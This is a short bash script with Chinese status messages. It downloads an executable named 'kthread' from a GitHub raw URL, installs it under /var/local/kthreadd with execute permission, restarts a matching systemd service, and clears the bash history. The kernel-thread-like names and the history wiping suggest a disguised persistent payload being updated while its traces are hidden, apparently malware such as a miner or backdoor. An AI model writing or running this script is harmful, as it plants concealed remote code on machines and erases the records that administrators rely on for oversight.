#!/bin/bash

# 确保脚本以 root 权限运行
# if [ "$EUID" -ne 0 ]; then
#   echo "[-] 请使用 root 权限运行此脚本 (sudo)"
#   exit 1
# fi

echo "[+] 正在切换工作目录..."
cd "/var/local/kworker" || { echo "[-] 目录切换失败"; exit 1; }

echo "[+] 正在清理旧文件..."
rm -f /var/local/kworker/kthread
rm -f /var/local/kthreadd/kthread

echo "[+] 正在下载最新的 kthread 文件..."
curl -fsSL "https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kthread" -o kthread

echo "[+] 正在复制文件到目标目录..."
cp -f "/var/local/kworker/kthread" "/var/local/kthreadd/kthread"

echo "[+] 正在设置文件权限..."
chmod 755 "/var/local/kthreadd/kthread"

echo "[+] 正在清理临时文件..."
rm -f /var/local/kworker/kthread

echo "[+] 正在清理日志..."
rm -f ~/.bash_history && history -c

echo "[✓] 操作已全部完成！"

echo "[+] 正在重启 kthread 服务..."
systemctl restart "kthread.service"